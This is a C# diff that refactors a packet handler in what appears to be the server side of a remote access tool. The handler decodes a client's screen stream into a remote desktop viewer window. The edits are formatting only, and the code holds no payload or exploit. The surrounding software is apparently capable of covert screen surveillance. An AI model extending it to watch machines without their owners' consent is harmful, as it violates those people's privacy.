@@ -1,12 +1,11 @@
-﻿using Server.Forms;
-using Server.Helper;
-using Server.MessagePack;
-using Server.Connection;
-using System;
+﻿using System;
 using System.Diagnostics;
-using System.Drawing;
 using System.IO;
 using System.Windows.Forms;
+using Server.Connection;
+using Server.Forms;
+using Server.Helper;
+using Server.MessagePack;
 
 namespace Server.Handle_Packet
 {
@@ -16,7 +15,8 @@ namespace Server.Handle_Packet
         {
             try
             {
-                FormRemoteDesktop RD = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
+                var RD = (FormRemoteDesktop)Application.OpenForms[
+                    "RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
                 try
                 {
                     if (RD != null)
@@ -26,16 +26,18 @@ namespace Server.Handle_Packet
                             RD.Client = client;
                             RD.labelWait.Visible = false;
                             RD.timer1.Start();
-                            byte[] RdpStream0 = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
-                            Bitmap decoded0 = RD.decoder.DecodeData(new MemoryStream(RdpStream0));
+                            var RdpStream0 = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
+                            var decoded0 = RD.decoder.DecodeData(new MemoryStream(RdpStream0));
                             RD.rdSize = decoded0.Size;
-                            int Screens = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
+                            var Screens = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
                             RD.numericUpDown2.Maximum = Screens - 1;
                         }
-                        byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
+
+                        var RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                         lock (RD.syncPicbox)
                         {
-                            using (MemoryStream stream = new MemoryStream(RdpStream)){
+                            using (var stream = new MemoryStream(RdpStream))
+                            {
                                 var StreamDecodeData = RD.decoder.DecodeData(stream);
                                 RD.GetImage = StreamDecodeData;
                                 RD.rdSize = StreamDecodeData.Size;
@@ -45,7 +47,9 @@ namespace Server.Handle_Packet
                             RD.FPS++;
                             if (RD.sw.ElapsedMilliseconds >= 1000)
                             {
-                                RD.Text = "RemoteDesktop:" + client.ID + "    FPS:" + RD.FPS + "    Screen:" + RD.GetImage.Width + " x " + RD.GetImage.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
+                                RD.Text = "RemoteDesktop:" + client.ID + "    FPS:" + RD.FPS + "    Screen:" +
+                                          RD.GetImage.Width + " x " + RD.GetImage.Height + "    Size:" +
+                                          Methods.BytesToString(RdpStream.Length);
                                 RD.FPS = 0;
                                 RD.sw = Stopwatch.StartNew();
                             }
@@ -54,12 +58,16 @@ namespace Server.Handle_Packet
                     else
                     {
                         client.Disconnected();
-                        return;
                     }
                 }
-                catch (Exception ex) { Debug.WriteLine(ex.Message); }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine(ex.Message);
+                }
             }
-            catch { }
+            catch
+            {
+            }
         }
     }
 }
